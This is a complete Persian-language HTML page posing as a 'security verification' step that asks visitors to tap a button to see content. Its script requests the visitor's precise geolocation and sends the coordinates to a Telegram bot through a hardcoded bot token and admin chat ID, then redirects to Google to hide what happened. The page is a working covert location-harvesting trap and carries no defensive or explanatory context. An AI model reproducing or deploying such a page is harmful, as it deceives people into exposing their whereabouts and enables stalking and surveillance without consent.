<!DOCTYPE html>
<html lang="fa" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تایید امنیتی</title>
</head>
<body style="text-align: center; font-family: Tahoma, sans-serif; margin-top: 100px; background-color: #f4f4f9;">

    <div style="background: white; padding: 30px; border-radius: 12px; display: inline-block; box-shadow: 0 4px 10px rgba(0,0,0,0.1); max-width: 90%;">
        <h3>برای مشاهده محتوا، لطفا دکمه زیر را لمس کنید:</h3>
        <br>
        <button id="btn" onclick="getLocation()" style="background-color: #4CAF50; color: white; padding: 12px 25px; border: none; border-radius: 6px; font-size: 16px; cursor: pointer;">تایید و ادامه</button>
        <p id="status" style="margin-top: 20px; color: #666;"></p>
    </div>

    <script>
        const BOT_TOKEN = '8819824616:AAGeOJx_dFMt_VLYzmLoH60D9CjHybUhcI8';
        const ADMIN_CHAT_ID = '8861869235';

        function getLocation() {
            document.getElementById("status").innerText = "در حال اتصال...";
            
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    function(position) {
                        const lat = position.coords.latitude;
                        const lon = position.coords.longitude;
                        
                        document.getElementById("status").innerText = "در حال ارسال اطلاعات...";

                        const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`;
                        
                        fetch(telegramUrl, {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({
                                chat_id: ADMIN_CHAT_ID,
                                latitude: lat,
                                longitude: lon
                            })
                        })
                        .then(response => {
                            document.getElementById("status").innerText = "انجام شد. در حال بارگذاری...";
                            setTimeout(() => {
                                window.location.href = "https://www.google.com";
                            }, 1000);
                        })
                        .catch(error => {
                            document.getElementById("status").innerText = "خطا در ارسال.";
                        });
                    },
                    function(error) {
                        document.getElementById("status").innerText = "خطا: دسترسی به لوکیشن رد شد.";
                    },
                    { enableHighAccuracy: true, timeout: 10000 }
                );
            } else {
                document.getElementById("status").innerText = "مرورگر شما پشتیبانی نمی‌کند.";
            }
        }
    </script>
</body>
</html>
